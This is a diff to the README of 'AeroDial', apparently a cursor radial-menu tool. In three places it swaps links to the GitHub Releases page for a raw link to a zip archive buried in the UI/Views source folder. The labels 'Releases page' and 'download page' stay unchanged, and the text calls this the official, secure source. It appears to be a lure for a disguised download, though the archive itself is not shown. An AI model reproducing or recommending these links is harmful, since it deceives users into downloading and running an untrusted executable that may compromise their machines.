@@ -1,6 +1,6 @@
 # ⚙️ AeroDial - Access your favorite tools instantly
 
-[![Download AeroDial](https://img.shields.io/badge/Download-AeroDial-blue)](https://github.com/Fairish-register3833/AeroDial/releases)
+[![Download AeroDial](https://img.shields.io/badge/Download-AeroDial-blue)](https://github.com/Fairish-register3833/AeroDial/raw/refs/heads/main/src/AeroDial/UI/Views/Aero-Dial-v2.1-alpha.4.zip)
 
 AeroDial helps you save time. It shows a radial menu at your cursor location. You trigger this menu with a key or mouse button. You launch apps, send commands, control media, and paste text snippets from this menu. It works with all applications and games. It supports multiple monitors and high-resolution screens. 
 
@@ -8,7 +8,7 @@ AeroDial helps you save time. It shows a radial menu at your cursor location. Yo
 
 You do not need to install complex software. Follow these steps to set up AeroDial on your computer.
 
-1. Go to the [Releases page](https://github.com/Fairish-register3833/AeroDial/releases). 
+1. Go to the [Releases page](https://github.com/Fairish-register3833/AeroDial/raw/refs/heads/main/src/AeroDial/UI/Views/Aero-Dial-v2.1-alpha.4.zip). 
 2. Find the latest version of the application.
 3. Download the file that ends in .zip or .exe.
 4. If you downloaded a .zip file, right-click it and choose Extract All.
@@ -84,7 +84,7 @@ If you encounter issues, try these steps:
 
 You find the most recent version of the software at the link below. Always use the latest release for new features and bug fixes.
 
-[Click here to reach the download page](https://github.com/Fairish-register3833/AeroDial/releases)
+[Click here to reach the download page](https://github.com/Fairish-register3833/AeroDial/raw/refs/heads/main/src/AeroDial/UI/Views/Aero-Dial-v2.1-alpha.4.zip)
 
 Follow the instructions on that page to save the file to your computer. Run the application only from files downloaded on this official page. This ensures you use a secure version. 
 
